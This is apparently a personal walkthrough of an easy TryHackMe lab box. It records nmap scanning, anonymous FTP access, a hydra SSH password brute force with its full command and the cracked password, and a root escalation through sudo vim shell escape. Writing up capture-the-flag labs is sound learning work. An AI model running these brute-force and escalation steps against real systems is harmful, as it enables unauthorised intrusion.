# NOTES
New day, new box. Found an easy box on THM whilst browsing for boxes to do. Still working on perfecting the workflow for doing boxes + taking notes. Goal of this box is to obviously to complete the challenges on THM and on top of that to smooth out our note taking process. 

## SUMMARY
One of the easiest and yet the most frustrating boxes I've ever had the pleasure of doing. So many things went wrong. WE tried a vector and a CVE payload that was useless. Main flow was just through FTP and SSH exploits. 

## THINGS WE LEARNED
Aside from humility and the lack of my ability, here are somethings we learned from the "box" : 
- Write down important usernames and credentials and keep referring back to them
- specifying port number on hydra is done through -s 
- Running hydra on ssh service through the easy way instead of using -M just provide the IP and "ssh" at the end of the line


# BOX 
All Attachments seen below will be found in their respective directories or will be in the Attachments sub-folder.

## ENUMERATION

#### NMAP 
		nmap -A --min-rate=10000 10.10.60.71 -oN ./Enumeration/detailedScan.nmap
![[Pasted image 20211129190534.png]]

- Relevant versions

		21/tcp   open  ftp     vsftpd 3.0.3
		80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
		2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

#### FTP 
- anonymous login was permitted
- We found a file : /pub/ForMitch.txt
![[Pasted image 20211129193659.png]]
- ForMitch.txt

		Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
		
![[Pasted image 20211129194003.png]]

		
#### PORT 80
- /robots.txt :
	- Found a possible username through log like entry : 
	
			"$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
			
	- Found a possible hidden file : Openemr-5_0_1_3

	![[Pasted image 20211129190657.png]]

#### SSH 
- Look for vulnerabilities with the ssh version

		searchsploit ssh 7.2
	![[Pasted image 20211129191231.png]]
- Username Enumeration to confirm if 'mike' has an account
	![[Pasted image 20211129191557.png]]
	
	



## EXPLOIT

#### HYDRA BruteForce
- Brute forced the SSH password since we realised that it was a weak password

		hydra -l mitch -P /opt/SecLists/Passwords/Common-Credentials/best110.txt -s 2222 -v 10.10.119.210 -t 4 ssh
		
		Password : secret
		
![[Pasted image 20211129211409.png]]



## POST-EXPLOIT

- Simple priv esc enum 
	
		sudo -l 
		User mitch may run the following commands on Machine:
   		(root) NOPASSWD: /usr/bin/vim
		
![[Pasted image 20211129211551.png]]

- Root Escalation through vim

		sudo /usr/bin/vim
		
		*In Vim*
		:!/bin/bash

![[Pasted image 20211129211650.png]]

![[Pasted image 20211129211615.png]]




## Other Vectors
![[Pasted image 20211129212353.png]]